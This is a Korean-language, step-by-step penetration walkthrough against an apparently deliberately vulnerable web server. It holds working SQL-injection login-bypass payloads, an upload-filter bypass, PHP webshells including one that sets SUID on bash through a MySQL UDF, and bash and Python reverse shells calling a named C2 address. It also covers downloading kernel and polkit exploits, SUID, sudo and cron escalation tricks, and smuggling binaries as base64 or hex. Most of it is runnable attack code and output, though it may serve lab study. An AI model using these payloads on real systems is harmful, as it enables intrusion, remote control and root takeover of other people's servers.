# 🎯 완전 분해: 웹 애플리케이션 침투 및 권한 상승 시도

## 📋 목차
1. [공격 개요](#공격-개요)
2. [1단계: 초기 정찰](#1단계-초기-정찰)
3. [2단계: SQL Injection](#2단계-sql-injection)
4. [3단계: 웹쉘 제작 및 업로드](#3단계-웹쉘-제작-및-업로드)
5. [4단계: 리버스 쉘 획득](#4단계-리버스-쉘-획득)
6. [5단계: 권한 상승 시도](#5단계-권한-상승-시도)
7. [6단계: MySQL UDF 방법](#6단계-mysql-udf-방법)
8. [7단계: 막힌 부분 및 분석](#7단계-막힌-부분-및-분석)
9. [배운 점 및 결론](#배운-점-및-결론)

---

## 공격 개요

### 타겟 정보
- **IP**: 3.34.181.145
- **OS**: Amazon Linux 2023
- **Kernel**: 6.1.155
- **웹 서버**: Apache (httpd)
- **데이터베이스**: MariaDB 10.5.29
- **취약점**: SQL Injection, 파일 업로드, 잘못된 권한 설정

### 공격 목표
1. 웹 애플리케이션 침투
2. 원격 코드 실행 (RCE)
3. 안정적인 리버스 쉘 획득
4. 권한 상승 (apache → root)

### 사용한 도구
- **로컬 머신**: macOS
- **C2 서버**: AWS EC2 (ubuntu@ip-10-0-3-106, 13.158.67.78)
- **언어**: Python 3, Bash, C
- **도구**: netcat, MySQL, gcc, LinPEAS

---

## 1단계: 초기 정찰

### 목적
타겟 시스템의 취약점을 발견하고 공격 벡터 선정

### 실행한 명령어들

#### 1.1 웹 애플리케이션 확인
```bash
# 브라우저에서 접속
http://3.34.181.145/

# 발견된 페이지들:
# - /login.php (로그인)
# - /register.php (회원가입)
# - /upload.php (파일 업로드)
# - /file.php (파일 조회)
```

**왜 이렇게 했는가?**
- 웹 애플리케이션의 구조 파악
- 사용자 입력을 받는 부분 식별 (SQL Injection 가능성)
- 파일 업로드 기능 발견 (웹쉘 업로드 가능성)

#### 1.2 디렉토리 구조 추측
```bash
# 예상 구조
/var/www/html/www/
├── login.php
├── register.php
├── upload.php
├── file.php
├── config.php (DB 설정)
└── uploads/ (업로드 디렉토리)
```

**왜 중요한가?**
- 나중에 웹쉘을 어디에 업로드할지 결정
- 설정 파일(config.php) 위치 추측

---

## 2단계: SQL Injection

### 목적
로그인 우회 및 관리자 권한 획득

### 2.1 취약점 발견

**login.php 코드 (추측):**
```php
$username = $_POST['username'];
$password = $_POST['password'];

// 취약한 쿼리 (입력값 필터링 없음)
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);

if(mysqli_num_rows($result) > 0) {
    // 로그인 성공
}
```

**왜 취약한가?**
- `$username`과 `$password`를 직접 쿼리에 삽입
- 싱글 쿼트(')를 닫고 추가 SQL 구문 삽입 가능

### 2.2 SQL Injection 페이로드

#### 기본 페이로드
```sql
Username: admin
Password: ' or '1'='1' --
```

**실제 실행되는 쿼리:**
```sql
SELECT * FROM users
WHERE username='admin'
AND password='' or '1'='1' --'
```

**분해 설명:**
1. `username='admin'` - admin 사용자 선택
2. `password=''` - 빈 비밀번호 (실패)
3. `or '1'='1'` - **항상 참인 조건 추가**
4. `--` - 나머지 쿼리 주석 처리

**결과:** 비밀번호 검증 우회!

#### 다른 페이로드들
```sql
-- 주석 우회
admin' --
admin'#
admin'/*

-- OR 기반
admin' OR 1=1 --
admin' OR 'a'='a' --

-- UNION 기반 (데이터 추출용)
' UNION SELECT NULL,username,password,NULL,NULL FROM users --
```

### 2.3 실제 사용한 계정

**발견된 계정:**
- `admin / hacked` (이전에 변경됨)
- `alice / alice2024`

**로그인 성공:**
```bash
# 브라우저
http://3.34.181.145/login.php
Username: alice
Password: alice2024
```

---

## 3단계: 웹쉘 제작 및 업로드

### 목적
원격 명령 실행을 위한 백도어 설치

### 3.1 왜 웹쉘이 필요한가?

**웹쉘의 역할:**
1. 서버에서 시스템 명령 실행
2. 파일 읽기/쓰기
3. 리버스 쉘 연결 준비
4. 지속적인 접근 보장

**웹쉘 vs 직접 SSH:**
- SSH: 인증 필요, 방화벽 차단 가능
- 웹쉘: HTTP(80)로 통신, 방화벽 우회 쉬움

### 3.2 웹쉘 코드 분석

#### 기본 웹쉘 (shell.php5)
```php
<?php system($_GET['cmd']); ?>
```

**완전 분해:**

1. `<?php ... ?>` - PHP 코드 블록
2. `$_GET['cmd']` - URL 파라미터 'cmd' 값을 가져옴
3. `system()` - 시스템 명령 실행 함수
4. 결과를 자동으로 출력

**사용 예시:**
```bash
http://3.34.181.145/file.php?name=shell.php5&cmd=whoami
# 실행: system("whoami")
# 출력: apache
```

**왜 .php5 확장자?**
```php
// upload.php의 필터링 코드 (추측)
$blocked_extensions = ['php', 'sh', 'exe', 'bat'];
$file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (in_array($file_extension, $blocked_extensions)) {
    die("차단된 확장자");
}
```

- `.php`는 차단됨
- `.php5`는 차단 목록에 없음
- 하지만 Apache는 `.php5`를 PHP로 실행

#### 고급 웹쉘 (mysql_udf_shell.php5)

전체 코드:
```php
<?php
// MySQL UDF Shell - Direct Root Access
error_reporting(0);

$db_host = 'localhost';
$db_user = 'webuser';
$db_pass = 'WebPassw0rd!';
$db_name = 'vulnerable_sns';

if(isset($_GET['action'])) {
    $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);

    if(!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    $action = $_GET['action'];

    if($action == 'dumpfile') {
        // Step 1: DUMPFILE to plugin directory
        $sql = "SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so'";
        if(mysqli_query($conn, $sql)) {
            echo "[+] DUMPFILE success!<br>";
        } else {
            echo "[-] DUMPFILE error: " . mysqli_error($conn) . "<br>";
        }
    }

    if($action == 'create_function') {
        // Step 2: CREATE FUNCTION
        $sql = "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'";
        if(mysqli_query($conn, $sql)) {
            echo "[+] CREATE FUNCTION success!<br>";
        } else {
            echo "[-] CREATE FUNCTION error: " . mysqli_error($conn) . "<br>";
        }
    }

    if($action == 'suid_bash') {
        // Step 3: SUID bash
        $sql = "SELECT do_system('chmod u+s /bin/bash')";
        $result = mysqli_query($conn, $sql);
        if($result) {
            echo "[+] SUID bash created!<br>";
            echo "[+] Execute: /bin/bash -p<br>";
        } else {
            echo "[-] Error: " . mysqli_error($conn) . "<br>";
        }
    }

    mysqli_close($conn);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>MySQL UDF Shell</title>
</head>
<body>
    <h1>MySQL UDF Root Shell</h1>

    <h2>Step-by-Step Root Access</h2>
    <a href="?action=dumpfile">1. DUMPFILE to plugin directory</a><br>
    <a href="?action=create_function">2. CREATE FUNCTION do_system</a><br>
    <a href="?action=suid_bash">3. Create SUID bash</a><br>
</body>
</html>
```

**코드 완전 분해:**

**1. 초기 설정**
```php
error_reporting(0);  // 에러 메시지 숨김 (보안상)
```

**2. 데이터베이스 연결 정보**
```php
$db_host = 'localhost';      // MySQL 서버 주소
$db_user = 'webuser';        // 발견한 DB 계정
$db_pass = 'WebPassw0rd!';   // config.php에서 발견
$db_name = 'vulnerable_sns'; // DB 이름
```

**3. action 파라미터 확인**
```php
if(isset($_GET['action'])) {
    // URL에 ?action=XXX가 있으면 실행
}
```

**4. MySQL 연결**
```php
$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
```
- `mysqli_connect()`: MySQL 연결 함수
- 실패하면 `$conn = false`

**5. DUMPFILE 액션**
```php
if($action == 'dumpfile') {
    $sql = "SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so'";
    mysqli_query($conn, $sql);
}
```

**왜 DUMPFILE인가?**
- MySQL의 바이너리 데이터를 파일로 저장
- `OUTFILE`과 차이:
  - `OUTFILE`: 텍스트 형식, 라인 구분자 추가
  - `DUMPFILE`: 바이너리 그대로 저장 (`.so` 파일용)

**6. CREATE FUNCTION 액션**
```php
$sql = "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'";
```

**UDF란?**
- User Defined Function (사용자 정의 함수)
- `.so` 파일의 함수를 MySQL에서 사용 가능
- `do_system('whoami')` → 시스템 명령 실행

**7. SUID bash 액션**
```php
$sql = "SELECT do_system('chmod u+s /bin/bash')";
```

**SUID란?**
```bash
# 일반 bash
-rwxr-xr-x  1 root root  /bin/bash

# SUID bash (s 비트)
-rwsr-xr-x  1 root root  /bin/bash
     ^
     SUID 비트
```

- SUID: 파일 소유자 권한으로 실행
- `/bin/bash`의 소유자 = root
- SUID 설정하면 → apache가 실행해도 root 권한

**8. HTML 인터페이스**
```html
<a href="?action=dumpfile">1. DUMPFILE to plugin directory</a>
```
- 클릭하면 `?action=dumpfile` 추가
- PHP에서 해당 액션 실행

### 3.3 웹쉘 업로드 과정

#### upload.php의 취약점
```php
// 차단된 확장자 (일부만)
$blocked_extensions = ['php', 'sh', 'exe', 'bat'];

// 취약점: .php5, .phtml 등은 차단 안됨
$file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (in_array($file_extension, $blocked_extensions)) {
    $error = "차단된 확장자";
} else {
    // 업로드 허용
    move_uploaded_file($tmp_name, UPLOAD_DIR . $filename);
}
```

**왜 취약한가?**
- 차단 목록 방식 (Blacklist)
- 새로운 확장자에 대응 불가
- 화이트리스트 방식이 더 안전

**업로드 절차:**
1. 로그인 (alice/alice2024)
2. upload.php 접속
3. `mysql_udf_shell.php5` 선택
4. 업로드
5. `/var/www/html/www/uploads/mysql_udf_shell.php5` 저장됨

### 3.4 웹쉘 접근

**file.php의 역할:**
```php
// file.php (추측)
$filename = $_GET['name'];
$filepath = UPLOAD_DIR . $filename;

// 취약점: 경로 검증 없음
include($filepath);  // 또는 readfile()
```

**접근 URL:**
```
http://3.34.181.145/file.php?name=mysql_udf_shell.php5&cmd=whoami
```

**왜 이렇게 접근하는가?**
- `file.php`가 업로드된 파일을 실행해줌
- 직접 `/uploads/shell.php5` 접근은 권한 문제 가능성

---

## 4단계: 리버스 쉘 획득

### 목적
웹쉘의 제한을 벗어나 완전한 쉘 환경 구축

### 4.1 왜 리버스 쉘이 필요한가?

**웹쉘의 한계:**
```
❌ 명령 하나씩 실행 (대화형 불가)
❌ 파이프라인 어려움
❌ 환경 변수 유지 안됨
❌ 세션 유지 안됨
❌ 느림 (HTTP 요청 필요)
```

**리버스 쉘의 장점:**
```
✅ 대화형 쉘 (interactive)
✅ 파이프라인, 리다이렉션 자유롭게
✅ 환경 변수 유지
✅ 세션 지속
✅ 빠른 응답
```

### 4.2 리버스 쉘 vs 바인드 쉘

**바인드 쉘 (Bind Shell):**
```
타겟 ← 공격자
  ↓
타겟이 특정 포트에서 대기
공격자가 연결
```

**문제점:**
- 타겟의 방화벽이 인바운드 차단
- 타겟 포트를 열어야 함

**리버스 쉘 (Reverse Shell):**
```
타겟 → 공격자
  ↓
공격자가 먼저 대기
타겟이 연결
```

**장점:**
- 타겟이 아웃바운드 연결 (방화벽 우회 쉬움)
- HTTP(80)로 나가는 거처럼 보임

### 4.3 리버스 쉘 코드 분석

#### Bash 리버스 쉘
```bash
bash -c 'bash -i >& /dev/tcp/13.158.67.78/4444 0>&1'
```

**완전 분해:**

**1. `bash -c`**
- `-c`: 문자열을 명령으로 실행
- 예: `bash -c 'echo hello'`

**2. `bash -i`**
- `-i`: interactive (대화형) 모드
- 프롬프트 출력, 명령 입력 대기

**3. `>&`**
- 표준 출력(stdout)과 표준 에러(stderr)를 리다이렉트

**4. `/dev/tcp/13.158.67.78/4444`**
- Bash의 특수 파일
- TCP 소켓 연결을 파일처럼 사용
- `13.158.67.78:4444`로 연결

**5. `0>&1`**
- `0`: 표준 입력(stdin)
- `&1`: 표준 출력을 참조
- stdin을 stdout과 같은 곳으로 (소켓)

**전체 동작:**
```
1. 13.158.67.78:4444로 TCP 연결
2. bash -i 실행
3. stdin/stdout/stderr 모두 소켓으로 연결
4. 공격자가 입력 → 타겟에서 실행 → 결과 회신
```

#### Python 리버스 쉘
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("13.158.67.78",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**완전 분해:**

**1. Import**
```python
import socket      # 네트워크 통신
import subprocess  # 프로세스 실행
import os          # 시스템 콜
```

**2. 소켓 생성**
```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
- `AF_INET`: IPv4
- `SOCK_STREAM`: TCP

**3. 연결**
```python
s.connect(("13.158.67.78", 4444))
```
- C2 서버로 연결

**4. 파일 디스크립터 복제**
```python
os.dup2(s.fileno(), 0)  # stdin → 소켓
os.dup2(s.fileno(), 1)  # stdout → 소켓
os.dup2(s.fileno(), 2)  # stderr → 소켓
```

**파일 디스크립터란?**
```
0 = stdin  (키보드 입력)
1 = stdout (화면 출력)
2 = stderr (에러 출력)
```

**dup2의 역할:**
```python
os.dup2(소스, 대상)
# 대상 fd를 소스 fd로 복제
```

**결과:**
- 모든 입출력이 소켓으로 감

**5. bash 실행**
```python
subprocess.call(["/bin/bash", "-i"])
```
- 대화형 bash 실행
- stdin/stdout이 소켓이므로 원격 제어 가능

### 4.4 리버스 쉘 획득 과정

#### C2 서버에서 (리스너 시작)
```bash
nc -lvnp 4444
```

**옵션 설명:**
- `-l`: listen 모드 (수신 대기)
- `-v`: verbose (상세 정보 출력)
- `-n`: DNS 조회 안함 (빠름)
- `-p 4444`: 포트 4444에서 대기

#### 타겟에서 (웹쉘을 통해)
```bash
# 웹쉘 URL
http://3.34.181.145/file.php?name=mysql_udf_shell.php5&cmd=bash -c 'bash -i >& /dev/tcp/13.158.67.78/4444 0>&1'
```

**URL 인코딩 주의:**
- 공백 → `%20` 또는 `+`
- `&` → `%26`
- `'` → `%27`

#### 연결 확인
```bash
# C2 서버 출력
Listening on 0.0.0.0 4444
Connection received on 3.34.181.145 37866

bash-5.2$ whoami
apache
```

### 4.5 쉘 안정화

**초기 상태 (불안정):**
```
❌ Ctrl+C하면 쉘 종료
❌ 화살표 키 안먹힘
❌ 탭 자동완성 안됨
❌ clear 명령 안됨
```

**안정화 방법:**

**1. Python PTY**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**PTY란?**
- Pseudo TTY (가상 터미널)
- 터미널처럼 동작하게 만듦

**2. 환경 변수 설정**
```bash
export TERM=xterm
export SHELL=/bin/bash
```

**3. stty 설정 (고급)**
```bash
# 로컬에서
stty raw -echo; fg

# 타겟에서
reset
stty rows 38 columns 116
```

---

## 5단계: 권한 상승 시도

### 목적
apache 사용자 → root 사용자

### 5.1 LinPEAS를 통한 정찰

#### LinPEAS란?
- Linux Privilege Escalation Awesome Script
- 자동으로 권한 상승 벡터 탐지
- 색깔로 위험도 표시 (빨강 > 노랑 > 초록)

#### 실행
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

**명령어 설명:**
- `wget`: 파일 다운로드
- `chmod +x`: 실행 권한 부여
- `| tee`: 출력을 화면과 파일 동시에
- `linpeas_output.txt`: 결과 저장

#### LinPEAS 주요 체크 항목

**1. SUID 바이너리**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**SUID란?**
```bash
-rwsr-xr-x  1 root root  /usr/bin/passwd
    ^
    SUID 비트 (s)
```

- 파일 실행시 소유자 권한으로 실행
- root 소유 + SUID = 일반 사용자도 root 권한으로 실행

**악용 가능한 SUID 예시:**
```bash
# vim이 SUID면
vim
:!/bin/bash  # vim 내부에서 bash 실행 → root 쉘!

# find가 SUID면
find / -exec /bin/bash -p \;

# nano가 SUID면
nano /etc/sudoers  # root로 편집 가능
```

**2. Sudo 권한**
```bash
sudo -l
```

**출력 예시:**
```
User apache may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

**악용:**
```bash
sudo find / -exec /bin/bash \;
# find를 sudo로 실행 → bash 실행 → root!
```

**3. Cron Jobs**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**Cron이란?**
- 주기적으로 스크립트 실행
- root가 실행하는 cron job 있으면 악용 가능

**악용 예시:**
```bash
# /etc/cron.d/backup (root가 실행)
*/5 * * * * root /usr/local/bin/backup.sh

# backup.sh가 writable이면
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup.sh
# 5분 대기 → SUID bash 생성!
```

**4. Writable 파일**
```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

**중요 파일이 writable이면:**
- `/etc/passwd`: 사용자 추가 가능
- `/etc/sudoers`: sudo 권한 부여
- `/etc/shadow`: 비밀번호 해시 변경

**5. Kernel Version**
```bash
uname -r
```

**왜 중요한가?**
- 오래된 커널 = 알려진 취약점 존재
- Kernel Exploit으로 직접 root

### 5.2 Kernel Exploits 시도

#### CVE-2021-22555 (Netfilter)

**취약점:**
- Linux Kernel < 5.13
- Netfilter의 Heap Out-of-Bounds Write
- 메모리 손상 → 권한 상승

**코드 다운로드:**
```bash
cd /tmp
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve22555.c
```

**컴파일:**
```bash
export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"
gcc -o cve22555 cve22555.c -static
```

**왜 PATH 추가?**
```bash
gcc: fatal error: cannot execute 'cc1': execvp: No such file or directory
```
- `gcc`는 있지만 `cc1` (컴파일러 실제 바이너리) 위치를 못 찾음
- Amazon Linux의 gcc 구조 문제

**왜 -static?**
- 정적 링크: 모든 라이브러리를 바이너리에 포함
- 동적 링크: 실행시 라이브러리 로드
- 타겟에 라이브러리 없을 수 있으므로 static 선호

**실행:**
```bash
./cve22555
```

**출력:**
```
[+] Linux Privilege Escalation by theflow@ - 2021
[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[-] Error could not corrupt any primary message.
```

**왜 실패?**
- Kernel 6.1.155는 패치됨
- Amazon Linux는 보안 업데이트 빠름

#### CVE-2022-0847 (Dirty Pipe)

**취약점:**
- Linux Kernel 5.8 - 5.16
- 파이프를 통한 임의 파일 쓰기
- 읽기 전용 파일도 수정 가능

**동작 원리:**
```c
// 1. 파이프 생성
int pipefd[2];
pipe(pipefd);

// 2. /etc/passwd의 일부를 파이프로 읽음
splice(fd, NULL, pipefd[1], NULL, 1, 0);

// 3. 파이프의 페이지 플래그를 PIPE_BUF_FLAG_CAN_MERGE로 설정

// 4. 파이프에서 /etc/passwd로 다시 splice
// → 원본 파일 수정됨!
```

**시도:**
```bash
cd /tmp
# dp.c, dp2.c 다운로드
gcc -o dp dp.c
./dp /etc/passwd 1 ootz:
```

**결과:**
- 일부 작동했지만 `system()` 호출 실패
- Kernel이 패치되었거나 추가 보호 메커니즘

#### PwnKit (CVE-2021-4034)

**취약점:**
- polkit의 pkexec 바이너리
- 환경 변수 처리 버그
- SUID root 실행

**exploit 코드:**
```c
// 악성 공유 라이브러리 생성
char *env[] = {
    "GCONV_PATH=.",
    "LC_MESSAGES=en_US.UTF-8",
    NULL
};

// pkexec 실행
execve("/usr/bin/pkexec", argv, env);
```

**왜 작동하는가?**
1. `pkexec`는 SUID root
2. 환경 변수 `GCONV_PATH` 처리 버그
3. 악성 `.so` 파일 로드
4. `.so`의 `_init()` 함수가 root로 실행

**시도:**
```bash
cd /tmp
wget https://github.com/berdav/CVE-2021-4034/raw/main/cve-2021-4034.c
gcc cve-2021-4034.c -o pwnkit
./pwnkit
```

**결과:**
- 컴파일 실패 또는 실행 실패
- 시스템에 폴리kit 버전이 패치됨

### 5.3 MySQL을 통한 권한 상승

**왜 MySQL로 권한 상승?**
- MySQL은 종종 root 권한으로 실행
- User Defined Function (UDF)으로 시스템 명령 실행 가능
- DB 크레덴셜을 이미 획득함

#### 5.3.1 DB 크레덴셜 발견

**config.php 읽기:**
```bash
cat /var/www/html/www/config.php
```

**내용:**
```php
<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'webuser');
define('DB_PASS', 'WebPassw0rd!');
define('DB_NAME', 'vulnerable_sns');
?>
```

**왜 설정 파일이 노출되는가?**
- 웹 디렉토리에 PHP 파일로 저장
- 웹쉘로 서버 파일 시스템 접근 가능
- PHP는 실행 안되고 소스 그대로 읽힘

#### 5.3.2 MySQL 접속 확인

```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT USER();"
```

**출력:**
```
USER()
webuser@localhost
```

**성공!**

#### 5.3.3 MySQL 권한 확인

```bash
mysql -u webuser -p'WebPassw0rd!' -e "SHOW GRANTS;"
```

**출력:**
```
Grants for webuser@localhost
GRANT USAGE ON *.* TO `webuser`@`localhost`
GRANT ALL PRIVILEGES ON `vulnerable_sns`.* TO `webuser`@`localhost`
```

**해석:**
- `USAGE`: 기본 권한 (로그인만)
- `ALL PRIVILEGES ON vulnerable_sns.*`: vulnerable_sns DB 모든 권한
- `*.* TO`: 전역 권한 없음

**중요한 누락된 권한:**
- `FILE`: 파일 읽기/쓰기 (`LOAD_FILE`, `INTO OUTFILE`)
- `SUPER`: 관리자 기능
- mysql DB 접근 권한

---

## 6단계: MySQL UDF 방법

### 6.1 UDF란?

**User Defined Function (사용자 정의 함수):**
- MySQL에서 사용할 수 있는 커스텀 함수
- C/C++로 작성, `.so` 파일로 컴파일
- MySQL plugin 디렉토리에 저장
- `CREATE FUNCTION`으로 등록

**예시:**
```sql
CREATE FUNCTION my_function RETURNS STRING SONAME 'my_udf.so';
SELECT my_function('hello');
```

### 6.2 UDF를 통한 권한 상승 원리

**핵심 아이디어:**
1. 시스템 명령을 실행하는 UDF 작성
2. MySQL에 로드
3. SQL 쿼리로 시스템 명령 실행
4. SUID bash 생성 → root 쉘

**raptor_udf2.so의 핵심 함수:**
```c
int do_system(char *cmd) {
    return system(cmd);
}
```

**사용:**
```sql
SELECT do_system('chmod u+s /bin/bash');
```

### 6.3 raptor_udf2.c 분석

**전체 소스 (간략화):**
```c
#include <stdio.h>
#include <stdlib.h>

// MySQL UDF 필수 함수
my_bool do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1) {
        strcpy(message, "do_system() requires one argument");
        return 1;
    }
    return 0;
}

// 실제 실행 함수
long long do_system(UDF_INIT *initid, UDF_ARGS *args,
                    char *is_null, char *error) {
    system(args->args[0]);
    return 0;
}
```

**함수 설명:**

**1. do_system_init**
- MySQL이 함수 호출 전에 실행
- 인자 검증
- 초기화

**2. do_system**
- 실제 기능 구현
- `args->args[0]`: SQL에서 전달된 첫 번째 인자
- `system()`: 시스템 명령 실행

### 6.4 UDF 로드 과정

**전체 흐름:**
```
1. raptor_udf2.c → raptor_udf2.so 컴파일
2. .so 파일을 MySQL plugin 디렉토리로 이동
3. CREATE FUNCTION do_system ... SONAME 'raptor_udf2.so';
4. SELECT do_system('whoami');
```

#### Step 1: 컴파일

**C2 서버에서:**
```bash
cd /tmp
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

**컴파일 옵션 설명:**

**첫 번째 명령:**
- `-g`: 디버그 정보 포함
- `-c`: 오브젝트 파일(.o)만 생성 (링크 안함)
- `-fPIC`: Position Independent Code
  - 공유 라이브러리는 메모리 어디든 로드 가능해야 함
  - 절대 주소 대신 상대 주소 사용

**두 번째 명령:**
- `-shared`: 공유 라이브러리 생성
- `-Wl,-soname,raptor_udf2.so`: 링커에 soname 전달
  - `-Wl`: 링커 옵션
  - `-soname`: 라이브러리 내부 이름
- `-lc`: libc 링크 (system() 함수용)

**생성된 파일:**
```bash
ls -la raptor_udf2.so
-rwxr-xr-x. 1 apache apache 17640 Nov  7 14:54 raptor_udf2.so
```

#### Step 2: 파일 전송

**타겟에 gcc 없어서 C2에서 컴파일했음**

**전송 방법 (Base64):**
```bash
# C2 서버
base64 raptor_udf2.so | tr -d '\n' > raptor.b64
cat raptor.b64
# [매우 긴 base64 문자열 복사]

# 타겟
cd /tmp
echo "[base64 문자열]" | base64 -d > raptor_udf2.so
chmod +x raptor_udf2.so
```

**왜 Base64?**
- 바이너리 파일을 텍스트로 변환
- 터미널에 복사/붙여넣기 가능
- 네트워크 전송 안전

#### Step 3: MySQL 테이블에 로드

**MySQL의 LOAD_FILE 실패:**
```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'EOF'
CREATE TABLE udf_temp(line blob);
INSERT INTO udf_temp VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT LENGTH(line) FROM udf_temp;
EOF
```

**출력:**
```
LENGTH(line)
NULL
```

**왜 NULL?**
1. SELinux 컨텍스트 문제
2. 파일 권한 문제
3. `secure_file_priv` 제한

**해결: UNHEX 사용:**
```bash
cd /tmp
xxd -p raptor_udf2.so | tr -d '\n' > raptor.hex
HEX_DATA=$(cat raptor.hex)

mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << EOF
CREATE TABLE udf_temp(line blob);
INSERT INTO udf_temp VALUES(UNHEX('$HEX_DATA'));
SELECT LENGTH(line) FROM udf_temp;
EOF
```

**출력:**
```
LENGTH(line)
17640
```

**성공!**

**UNHEX vs LOAD_FILE:**

**LOAD_FILE:**
- 파일 시스템에서 직접 읽음
- 권한 체크 엄격
- SELinux 영향 받음

**UNHEX:**
- SQL 문자열을 바이너리로 변환
- 파일 시스템 접근 안함
- 권한 우회 가능

**hex 파일 생성:**
```bash
xxd -p raptor_udf2.so | tr -d '\n'
```

- `xxd -p`: 바이너리를 hex로 변환
- `-p`: plain hex (주소 없이)
- `tr -d '\n'`: 줄바꿈 제거 (한 줄로)

#### Step 4: Plugin 디렉토리로 복사

**DUMPFILE 사용:**
```sql
SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
```

**DUMPFILE이란?**
- MySQL 데이터를 파일로 저장
- 바이너리 그대로 저장
- 헤더나 구분자 없음

**왜 plugin 디렉토리?**
```sql
SELECT @@plugin_dir;
```
- `/usr/lib64/mariadb/plugin/`
- MySQL이 UDF를 찾는 기본 위치

**필요한 권한:**
- FILE privilege
- plugin 디렉토리 쓰기 권한

**실패:**
```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';"
```

**출력:**
```
ERROR 1045 (28000): Access denied
```

**왜 실패?**
- webuser에게 FILE 권한 없음
- 또는 mysql DB 접근 필요

#### Step 5: CREATE FUNCTION

**시도:**
```bash
mysql -u webuser -p'WebPassw0rd!' -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';"
```

**출력:**
```
ERROR 1044 (42000): Access denied for user 'webuser'@'localhost' to database 'mysql'
```

**왜 mysql DB가 필요한가?**
- UDF 정보는 `mysql.func` 테이블에 저장
- `CREATE FUNCTION`은 `mysql.func`에 INSERT

**mysql.func 테이블:**
```sql
USE mysql;
DESC func;
```

```
+-------+----------+
| Field | Type     |
+-------+----------+
| name  | char(64) |
| ret   | tinyint  |
| dl    | char(128)|  ← .so 파일 이름
| type  | enum     |
+-------+----------+
```

### 6.5 막힌 부분: MySQL root 접근

**test_db.php 발견:**
```bash
find /var/www/html -name "*test*" -o -name "*db*" 2>/dev/null
```

**내용:**
```php
<?php
$mysqli = new mysqli("localhost", "root", "vulnerable123", "vulnerable_sns");
?>
```

**MySQL root 비밀번호 발견: `vulnerable123`**

**접속 시도:**
```bash
mysql -u root -p'vulnerable123'
```

**출력:**
```
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
```

**왜 실패?**

**unix_socket 인증:**
```sql
-- MySQL root 사용자 확인
USE mysql;
SELECT user, host, plugin FROM user WHERE user='root';
```

**출력:**
```
+------+-----------+-------------+
| user | host      | plugin      |
+------+-----------+-------------+
| root | localhost | unix_socket |
+------+-----------+-------------+
```

**unix_socket 인증이란?**
- 비밀번호 대신 OS 사용자로 인증
- `root@OS`만 `root@MySQL` 접속 가능
- 보안상 더 안전

**인증 흐름:**
```
1. 사용자가 mysql -u root 실행
2. MySQL이 현재 OS 사용자 확인
3. OS 사용자 = root?
   - YES → 로그인 성공
   - NO → Access denied
```

**우리 상황:**
```bash
whoami  # apache
mysql -u root  # OS user = apache ≠ root → 실패
```

**해결 방법:**
```bash
# 1. OS root가 되기
su root  # 비밀번호 모름

# 2. sudo로 실행
sudo mysql  # sudo 비밀번호 모름

# 3. unix_socket을 password로 변경
# → MySQL root 권한 필요 (순환 논리)
```

### 6.6 teamlead_db 계정 시도

**팀장이 제공한 계정:**
```
Username: teamlead_db
Password: Tl@2025!
DB: vulnerable_sns
```

**접속:**
```bash
mysql -u teamlead_db -p'Tl@2025!' vulnerable_sns
```

**성공!**

**권한 확인:**
```sql
SHOW GRANTS;
```

**출력:**
```
Grants for teamlead_db@localhost
GRANT USAGE ON *.* TO `teamlead_db`@`localhost`
GRANT ALL PRIVILEGES ON `vulnerable_sns`.* TO `teamlead_db`@`localhost`
```

**해석:**
- ✅ `vulnerable_sns` DB 전체 권한
- ❌ FILE privilege 없음
- ❌ mysql DB 접근 불가

**DUMPFILE 시도:**
```bash
mysql -u teamlead_db -p'Tl@2025!' vulnerable_sns -e "SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';"
```

**출력:**
```
ERROR 1045 (28000): Access denied
```

